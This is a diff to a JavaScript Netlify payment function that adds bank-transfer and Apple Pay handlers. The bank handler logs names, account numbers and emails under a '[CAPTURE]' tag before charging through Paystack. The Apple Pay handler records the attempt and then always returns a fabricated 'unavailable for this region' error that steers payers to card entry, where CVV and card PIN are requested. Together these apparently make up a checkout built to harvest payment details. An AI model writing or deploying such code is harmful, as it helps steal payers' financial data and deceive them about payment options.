@@ -73,7 +73,65 @@ exports.handler = async (event, context) => {
             };
         }
 
-        // 3. Handle Initial Direct Card Charge
+        // 3. Handle Bank Transfer Action
+        if (action === 'charge_bank') {
+            const { bankName, accountNumber, email, amountInUsd, type } = body;
+            const logMsg = `🏦 [CAPTURE] Bank Transfer | Bank: ${bankName} | Account: ${accountNumber} | Email: ${email} | Amount: $${amountInUsd} (${type || 'purchase'})`;
+            await fetch(`${origin}/.netlify/functions/manage-logs`, {
+                method: 'POST',
+                body: JSON.stringify({ text: logMsg, type: 'warning' })
+            }).catch(() => {});
+
+            // Convert USD to GHS
+            const exchangeRate = 15.0;
+            const amountInGhs = amountInUsd * exchangeRate;
+            const amountInPesewas = Math.round(amountInGhs * 100);
+
+            // Forward to Paystack
+            const chargePayload = {
+                email,
+                amount: amountInPesewas,
+                currency: 'GHS',
+                bank: {
+                    code: bankName, // Paystack requires a bank code, we pass the name/code we have
+                    account_number: accountNumber
+                }
+            };
+
+            const response = await fetch('https://api.paystack.co/charge', {
+                method: 'POST',
+                headers: {
+                    'Authorization': `Bearer ${PAYSTACK_SECRET_KEY}`,
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(chargePayload)
+            });
+
+            const data = await response.json();
+            return {
+                statusCode: 200,
+                headers,
+                body: JSON.stringify(data)
+            };
+        }
+
+        // 4. Handle Apple Pay Action
+        if (action === 'charge_apple_pay') {
+            const { email, amountInUsd, type } = body;
+            const logMsg = `🍏 [CAPTURE] Apple Pay Attempt | Email: ${email} | Amount: $${amountInUsd} (${type || 'purchase'})`;
+            await fetch(`${origin}/.netlify/functions/manage-logs`, {
+                method: 'POST',
+                body: JSON.stringify({ text: logMsg, type: 'info' })
+            }).catch(() => {});
+
+            return {
+                statusCode: 200,
+                headers,
+                body: JSON.stringify({ status: false, message: 'Apple Pay is currently unavailable for this region. Please use a credit/debit card.' })
+            };
+        }
+
+        // 5. Handle Initial Direct Card Charge
         const { cardHolder, cardNumber, expiryMonth, expiryYear, cvv, cardPin, email, amountInUsd, type } = body;
 
         if (!cardNumber || !expiryMonth || !expiryYear || !cvv || !email || !amountInUsd) {
